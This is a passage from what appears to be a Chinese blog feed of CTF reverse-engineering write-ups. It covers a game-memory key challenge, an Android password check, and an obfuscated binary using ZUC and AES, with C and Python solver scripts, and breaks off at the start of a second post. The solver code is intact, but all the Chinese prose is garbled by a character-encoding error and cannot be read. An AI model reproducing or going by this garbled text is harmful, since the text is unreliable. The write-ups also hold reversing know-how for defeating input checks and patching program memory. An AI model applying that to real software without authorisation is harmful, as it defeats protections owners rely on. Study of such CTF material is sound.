ç»„æ•°æ®è§‚å¯Ÿäº†ä¸€ä¸‹ï¼šå‘ç°å¥‡æ•°ç»„å’Œå¶æ•°ç»„å¯¹åº”2ä¸ªä¸åŒlfsrç»“æ„ï¼Œå…³é”®åœ¨äºæœ€åä¸€ä¸ªå­—èŠ‚ç§»ä½ï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªlfsrç»“æ„ï¼‰åå¡«å…¥æ–°ä¸€ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚ä½†æ˜¯ä¸çŸ¥é“æ¯æ¬¡å¾ªç¯å¡«å……åˆ°æœ€é«˜çš„ä½0æˆ–1æ˜¯æ€ä¹ˆè®¡ç®—çš„å†³å®šçš„ã€‚ã€‚<br><img src="https://i.loli.net/2021/04/12/DqVs6Xo5rTMIWlA.png" alt="image-20210412135221959"></p><p>å…¶å®è¿™é‡Œéƒ½çŸ¥é“å†…å­˜çš„åœ°å€äº†ï¼Œè¦æ˜¯æŠŠç¨‹åºè°ƒè¯•èµ·æ¥ï¼Œé€šè¿‡ceçš„æ˜¯ä»€ä¹ˆè®¿é—®è¿™ä¸ªåœ°å€ï¼Œå¾—åˆ°æ“ä½œç›®æ ‡æ•°æ®çš„æŒ‡ä»¤åœ°å€ååœ¨è°ƒè¯•å™¨ä¸­å»å¯¹åº”æ‰¾åˆ°å…³é”®ä»£ç å°±å¾ˆç®€å•äº†ï¼Œç„¶è€Œè¿™ä¸ªæ¸¸æˆæˆ‘æ²¡èƒ½è°ƒè¯•èµ·æ¥ã€‚</p><p>ä½†è¿˜æœ‰ä¸€ä¸ªåŠæ³•ï¼šdumpå‡ºå½“æ—¶çš„å†…å­˜ï¼Œæ‹–è¿›idaä¸­åˆ†æï¼Œä¸€æ ·å’Œè°ƒè¯•ä¸€æ ·ã€‚ã€‚</p><p>æœ‰äº†è¿™ä¸ªæ€è·¯ï¼Œå…ˆæ˜¯ç›´æ¥å®šä½åˆ°æœ€åGetFlagæ—¶è¦è¿›è¡Œæ¯”è¾ƒçš„ä»£ç ï¼Œå‘ç°æœ‰å–å‡ºé‚£8å­—èŠ‚æ•°æ®ä½œä¸ºkeyå»å»è¿›è¡Œrc4è§£å¯†ï¼Œä»¥ä¸ºæœ‰ç›´æ¥æ¯”è¾ƒkeyæ˜¯å¦æ­£ç¡®çš„åœ°æ–¹ï¼Œä½†å¹¶æ²¡æœ‰å‘ç°ã€‚ç„¶ååˆè€è€å®å®å®šä½åˆ°è®¡ç®—ç”Ÿæˆkeyçš„åœ°æ–¹ï¼š</p><p><img src="https://i.loli.net/2021/04/12/RC47oJFqrIK2vaN.png" alt="image-20210412184108621"></p><p>ä¸Šé¢çš„ç®—æ³•ä¸­æœ‰ä¸€ä¸ªæœªçŸ¥é‡ï¼Œv0ï¼Œå°±æ˜¯è¦è¿è¡Œçš„æ¬¡æ•°ï¼Œï¼Œæˆ‘æ˜¯æŠŠ1-64éƒ½æ‰“å°äº†å‡ºæ¥ï¼Œåœ¨v0 == 8æ—¶ï¼Œå¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚</p><p>æœ€åå°±æ˜¯æ‰“å°å‡ºæ˜Ÿæ˜Ÿæ•°ä¸º105æ—¶çš„ç›®æ ‡å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> init[] = &#123;<span class="number">0x4E</span>, <span class="number">0x51</span>, <span class="number">0x14</span>, <span class="number">0xA1</span>, <span class="number">0xFA</span>, <span class="number">0xEE</span>, <span class="number">0xDB</span>, <span class="number">0xEA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__int64 v2, v3, v4;</span><br><span class="line"><span class="keyword">char</span> v5;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 v6;</span><br><span class="line">__int64 result;</span><br><span class="line"><span class="keyword">int</span> v0 = <span class="number">8</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v5 = v3++ &amp; <span class="number">0x3f</span>;</span><br><span class="line">v6 = v4 &amp; (*((__int64 *)init));</span><br><span class="line">v4 = (v4 &lt;&lt; <span class="number">1</span>) | (v4 &gt;&gt; <span class="number">63</span>);</span><br><span class="line">v2 ^= v6 &gt;&gt; v5; </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>(v3 &lt; <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">result = v2 | <span class="number">2</span>* (*((__int64 *)init));</span><br><span class="line">(*((__int64 *)init)) = result;</span><br><span class="line"></span><br><span class="line">--v0;</span><br><span class="line">&#125;<span class="keyword">while</span>(v0);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &lt;= <span class="number">105</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">fun();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>, init[j]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dd b7 d5 3b 45 51 84 ea</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ¸¸æˆå†…å­˜ï¼Œå¾—åˆ°flagã€‚</p><p><img src="https://i.loli.net/2021/04/12/p2RIdzDjMWwXZqG.png" alt="image-20210412184539407"></p><h3 id="MR-CheckIN"><a href="#MR-CheckIN" class="headerlink" title="MR_CheckIN"></a>MR_CheckIN</h3><p>å®‰å“é¢˜ï¼Œjebåç¼–è¯‘åï¼Œåœ¨MainActivityçš„onCreateæ–¹æ³•æ‰¾åˆ°è°ƒç”¨äº†ä¸€ä¸ªç›‘å¬æ–‡æœ¬æ¡†è¾“å…¥çš„ç±»ã€‚ä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è¾“å…¥passwordé•¿åº¦ä¸º39æ—¶æ‰å°†SIGNINæŒ‰é’®å¯åŠ¨ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/12/RKEgf5mp1rlGXyQ.png" alt="image-20210412185333718"></p><p>åé¢å°±æ˜¯å¤„ç†ä»æ–‡æœ¬æ¡†è¾“å…¥çš„å†…å®¹ï¼Œusernameè¦ä¸ºMRCTFï¼Œç„¶åæ£€æŸ¥äº†passwordçš„æ ¼å¼MRCTF{}ï¼Œæ¥ç€passwdçš„6-13è¿›è¡Œmd5åŠ å¯†åä¸ç¼–ç çš„æ•°æ®æ¯”è¾ƒï¼Œè¿™ä¸ªåœ¨çº¿è§£å¯†ä¸€ä¸‹å°±å¥½äº†ï¼š<strong>Andr01d</strong>ï¼Œå‰©ä¸‹çš„æ•°æ®ä¼ å…¥check2å‡½æ•°è¿›è¡Œè¿ç®—æ£€æŸ¥ã€‚</p><p><img src="https://i.loli.net/2021/04/12/rtjRiSdXNP5Klcg.png" alt="image-20210412185731359"></p><p>check2å‡½æ•°å°±æ˜¯ç”Ÿæˆä¸€ä¸ªå¯†é’¥åºåˆ—ç„¶åä¸è¾“å…¥å¼‚æˆ–åä¸ç¼–ç æ•°æ®æ¯”è¾ƒï¼š<br><img src="https://i.loli.net/2021/04/12/r5QGPNgA2azXcWR.png" alt="image-20210412190659182"></p><p>æˆ‘å¼€å§‹ç›´æ¥æŠŠä¸Šé¢ç”Ÿæˆå¯†é’¥åºåˆ—çš„nextæ–¹æ³•å¤åˆ¶åˆ°javaä¸­è¿è¡Œï¼Œä½†å¾—åˆ°å¯†é’¥åºåˆ—ä¸€ç›´ä¸å¯¹ã€‚ã€‚</p><p>ç„¶åç”¨äº†æœ€ç¬¨çš„æ–¹æ³•ï¼Œï¼Œå•æ­¥è°ƒè¯•ä¸€æ­¥ä¸€æ­¥å¾—åˆ°å¯†é’¥åºåˆ—ï¼Œå…¶å®æŠŠæœ€åé‚£ä¸ªåˆ¤æ–­æ¡ä»¶æ”¹ä¸€ä¸‹ï¼Œå¾—åˆ°è¿™ä¸ªåºåˆ—å°±æ–¹ä¾¿äº†ã€‚ã€‚</p><p>å¯†é’¥åºåˆ—ï¼š<strong>[49, 49, 49, 50, 53, 52, 55, 48, 54, 48, 53, 48, 48, 52, 48, 48, 48, 53, 50, 48, 49, 48, 48, 48, 48]</strong></p><p>æœ€åå¼‚æˆ–ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/04/12/sGjmcnix6TPkBAq.png" alt="image-20210412191628542"></p><h3 id="å¤ç¥çš„ä½è¯­"><a href="#å¤ç¥çš„ä½è¯­" class="headerlink" title="å¤ç¥çš„ä½è¯­"></a>å¤ç¥çš„ä½è¯­</h3><p>é­”æ”¹è¿‡çš„å¹³å¦åŒ–æ··æ·†ï¼Œï¼Œç”¨è„šæœ¬æ²¡å»æ‰ï¼Œç„¶åå°±æ˜¯ç¡¬çœ‹äº†ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/14/mJj6gvVdWCaYAhw.png" alt="image-20210413181523944"></p><p>å¼€å§‹å¯¹è¾“å…¥çš„ä¸€äº›æ“ä½œï¼Œåˆ¤æ–­é•¿åº¦å’Œå¯¹usernameè¿›è¡Œbytes.fromhex()çš„æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/04/12/EW7mQ3A2kHTtMJc.png" alt="image-20210412193243190"></p><p>ä¹‹åå°±æ˜¯é‚£ä¸ªå¾ˆå¤§çš„å‡½æ•°äº†ï¼Œè®°ä¸ºmixFuctionï¼Œä¹Ÿæ˜¯æ•´ä¸ªé¢˜çš„å…³é”®ï¼Œï¼Œä»€ä¹ˆæ“ä½œéƒ½è°ƒç”¨äº†å®ƒã€‚</p><p>é¦–å…ˆç¬¬ä¸€æ¬¡è°ƒè¯•çš„æ—¶å€™ï¼Œåœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†äºŒå¼ è¡¨ï¼Œæœç´¢åˆ°è¿™æ˜¯ç¥–å†²ä¹‹åºåˆ—å¯†ç ï¼Œæœ‰å¯†é’¥ä¸ivã€‚å†ä»”ç»†åˆ†æç¬¬ä¸€æ¬¡è°ƒç”¨é‚£ä¸ªmixFuctionå‡½æ•°ï¼Œå‘ç°ä¼ å…¥usernameçš„hex.decodeçš„å½¢å¼å’Œezivforefolwencï¼ŒçŒœæµ‹è¿™æ˜¯å°†usernameä½œä¸ºkeyï¼Œezivforefolwencä½œä¸ºivï¼Œè¿›è¡Œç¥–å†²åºåˆ—å¯†ç çš„åˆå§‹åŒ–ã€‚</p><p>ç„¶åç¬¬äºŒæ¬¡è°ƒç”¨mixFunctionï¼Œä¼ å…¥å‚æ•°8å’Œä¸€ä¸ªæŒ‡é’ˆï¼Œå•æ­¥æ­¥è¿‡è¿™ä¸ªå‡½æ•°å‘ç°ç”Ÿæˆ32å­—èŠ‚æ•°æ®ï¼Œä»ä¼ å…¥çš„å‚æ•°ä¸º8ï¼Œå’Œè¿™ä¸ªåºåˆ—å¯†ç çš„ç”Ÿæˆå¯†é’¥æµçš„æ€§è´¨ï¼š32ä½4å­—èŠ‚å¯†é’¥ä¸ºä¸€ä¸ªç”Ÿæˆå•å…ƒã€‚æˆ‘åˆè‡ªå·±ç”¨è¿™ä¸ªç›¸åŒçš„å¯†é’¥å’Œivæ¨¡æ‹Ÿäº†ç”Ÿæˆçš„å¯†é’¥ï¼Œç„¶åå¯¹æ¯”ï¼Œï¼Œæœç„¶ä¸€æ ·ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/12/yiX6IH4obUWvgTM.png" alt="image-20210412194741393"></p><p>æ¥ç€è°ƒç”¨çš„ä¸€ä¸ªmixFunctionè¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œç›´æ¥å•æ­¥æ­¥è¿‡åçœ‹å˜åŒ–ã€‚</p><p>ç»§ç»­åˆè°ƒç”¨çš„ä¸¤æ¬¡mixFunctionä¼ å…¥ä¸€ä¸ªkeyå’Œè¾“å…¥çš„passwdï¼Œåˆ†2æ¬¡åŠ å¯†ï¼Œæ¯æ¬¡åŠ å¯†16å­—èŠ‚ï¼Œåˆ†ç»„å¯†ç çš„ç‰¹å¾äº†ã€‚å•æ­¥æ­¥å…¥è°ƒè¯•mixFunctionå¾ˆå¡ï¼Œï¼Œç›´æ¥å¯¹passwdä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ï¼Œå‘ç°å¼€å§‹ç”¨ä¼ å…¥çš„keyå’Œpasswdè¿›è¡Œä¸€ä¸ªå¼‚æˆ–æ“ä½œï¼Œç»§ç»­F9ï¼Œåˆæ–­ä¸‹æ¥ï¼Œï¼Œä¸€ä¸ªå­—èŠ‚æ›¿æ¢æ“ä½œï¼Œè€Œä»ç›’å­çœ‹ï¼Œæ˜æ˜¾aesçš„sç›’ï¼Œå“ˆå“ˆè¢«å‘ç°äº†ï¼Œé‚£ä¹‹å‰å°±æ˜¯åˆå§‹è½®äº†ã€‚</p><p>åé¢æ˜¯ç”¨ä¹‹å‰ç”Ÿæˆçš„å¯†é’¥æµåŠ å¯†ï¼š</p><p><img src="https://i.loli.net/2021/04/12/65g7iN1jonLYG2D.png" alt="image-20210412200958875"></p><p>å…¶ä¸­åˆè°ƒç”¨äº†mixFunctionå‡½æ•°å¯¹å¯†é’¥æµè¿›è¡Œä¸€ä¸ªåºåˆ—æ“ä½œï¼Œè°ƒè¯•åˆ°å…³é”®ä½ç½®ï¼Œå¾—åˆ°åŠ å¯†ç®—æ³•ã€‚</p><p><img src="https://i.loli.net/2021/04/12/oG3p7UKMH2av6BN.png" alt="image-20210412202528482"></p><p>æœ€åè¿˜æœ‰ä¸€ä¸ªmixFunctionï¼šå¾ªç¯ç§»ä½æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/04/12/b72eDcHfSz43XPd.png" alt="image-20210412203433118"></p><p>æœ€åæ•´ä½“ä¸Šï¼Œæ•´ä¸ªåŠ å¯†å°±ç±»ä¼¼teaç»“æ„ï¼Œè§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>][<span class="number">256</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">208</span>, <span class="number">161</span>, <span class="number">129</span>, <span class="number">188</span>, <span class="number">124</span>, <span class="number">155</span>,   <span class="number">2</span>, <span class="number">228</span>,  <span class="number">47</span>,  <span class="number">51</span>, </span><br><span class="line">   <span class="number">54</span>, <span class="number">232</span>, <span class="number">187</span>,  <span class="number">18</span>, <span class="number">146</span>, <span class="number">244</span>,  <span class="number">18</span>, <span class="number">178</span>, <span class="number">177</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">195</span>, <span class="number">252</span>, <span class="number">223</span>, <span class="number">212</span>,  <span class="number">80</span>, <span class="number">220</span>, <span class="number">140</span>, </span><br><span class="line">   <span class="number">91</span>, <span class="number">233</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc_stream[] = &#123;<span class="number">3691317505</span>, <span class="number">783378847</span>, <span class="number">3109790973</span>, <span class="number">2450366240</span>,</span><br><span class="line"> <span class="number">1882631107</span>, <span class="number">1581884682</span>, <span class="number">2916488768</span>, <span class="number">1817239551</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">mul_2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cnt += ((a&gt;&gt;i)&amp;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf("%d", cnt);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> a*<span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> ((a*<span class="number">2</span>) | <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_key</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i, j, v43, v44;</span><br><span class="line"></span><br><span class="line">v44 = enc_stream[<span class="number">2</span>*index], v43 = enc_stream[<span class="number">2</span>*index+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v44 = mul_2(v43);</span><br><span class="line">v43 = mul_2(v44);</span><br><span class="line"></span><br><span class="line">key[index][i][<span class="number">0</span>] = v44 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">key[index][i][<span class="number">1</span>] = v43 &lt;&lt; <span class="number">18</span>;</span><br><span class="line">key[index][i][<span class="number">2</span>] = v43 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">key[index][i][<span class="number">3</span>] = v44 &lt;&lt; <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">ror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = (a &gt;&gt; i) | (a &lt;&lt; (<span class="number">0x20</span>-i));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gen_key(i);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tmp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line">tmp = enc[<span class="number">1</span>];</span><br><span class="line">enc[<span class="number">1</span>] = enc[<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] ^= tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] += ror(enc[<span class="number">0</span>], j&amp;<span class="number">0x1f</span>) ^ key[i][j][<span class="number">1</span>] | key[i][j][<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] += ror(enc[<span class="number">1</span>], j&amp;<span class="number">0x1f</span>) ^ key[i][j][<span class="number">3</span>] | key[i][j][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%x ", ror(0x00C68E92E3, 2));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, "</span>, ENC[i]); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>aesè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cry = AES.new(<span class="string">b"ezkeyforenc"</span>+bytes(<span class="number">5</span>), AES.MODE_ECB)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = cry.decrypt(bytes([<span class="number">138</span>, <span class="number">103</span>, <span class="number">149</span>, <span class="number">61</span>, <span class="number">251</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">155</span>, <span class="number">4</span>, <span class="number">129</span>, <span class="number">228</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">137</span>, <span class="number">132</span>, <span class="number">118</span>, <span class="number">214</span>, <span class="number">137</span>, <span class="number">47</span>, <span class="number">233</span>, <span class="number">229</span>, <span class="number">148</span>, <span class="number">23</span>, <span class="number">181</span>, <span class="number">45</span>, <span class="number">203</span>, <span class="number">80</span>, <span class="number">45</span>, <span class="number">251</span>, <span class="number">101</span>, <span class="number">6</span>, <span class="number">224</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">b'really_ez_flatten_obfu_can_u_fix'</span></span><br></pre></td></tr></table></figure><p>æœ€åè§£å¯†è¿˜åŸå¾—åˆ°çš„ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œè¿™ä¸æ‚é¡¹ã€‚ã€‚</p><p>æ‰¾åˆ°è¿™ä¸ªï¼š</p><p><img src="https://i.loli.net/2021/04/12/JcSsjlAgELORaku.png" alt="image-20210412203830511"></p><p>ç„¶åï¼Œï¼Œï¼Œå€’æ”¾éŸ³é¢‘å¬åˆ°flagã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸ªäººè§£é¢˜èµ›ï¼Œåšå®Œäº†é€†å‘é¢˜ï¼Œæ€»æ’åç¬¬5ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2021æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨</title>
    <link href="https://www.bxnop.cn/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    <id>https://www.bxnop.cn/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-03T11:41:38.000Z</published>
    <updated>2021-04-19T14:35:55.774Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬äºŒå±Šè™ç¬¦CTFï¼Œåˆ†äº«ä¸€ä¸‹é€†å‘é¢˜è§£ã€‚<a id="more"></a></p><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/15CH8WMsHoaRmMeIflV3Llg" target="_blank" rel="noopener">https://pan.baidu.com/s/15CH8WMsHoaRmMeIflV3Llg</a><br>æå–ç ï¼šz531<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p></blockquote><h3 id="redemption-code"><a href="#redemption-code" class="headerlink" title="redemption_code"></a>redemption_code</h3><p>32ä½mipsæ¶æ„åŠ¨æ€é“¾æ¥çš„ç¨‹åºã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403195047229.png" alt="image-20210403195047229"></p><p>å› ä¸ºåŠ¨æ€é“¾æ¥è¿è¡Œè¦æŒ‡å®šåº“è·¯å¾„ï¼Œè¿™é‡Œå°±ç›´æ¥é™æ€åˆ†æï¼Œè¿™ä¸ªé¢˜ä¹Ÿè¶³å¤Ÿäº†ã€‚</p><p>é¦–å…ˆçœ‹åˆ°å¯¹è¾“å…¥å­—ç¬¦ä¸²å¤„ç†çš„ç¬¬ä¸€ä¸ªå‡½æ•°preï¼šåˆ¤æ–­é•¿åº¦åï¼Œä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼æ“ä½œï¼Œä¸€èµ·ä¼ å…¥checkã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403200825059.png" 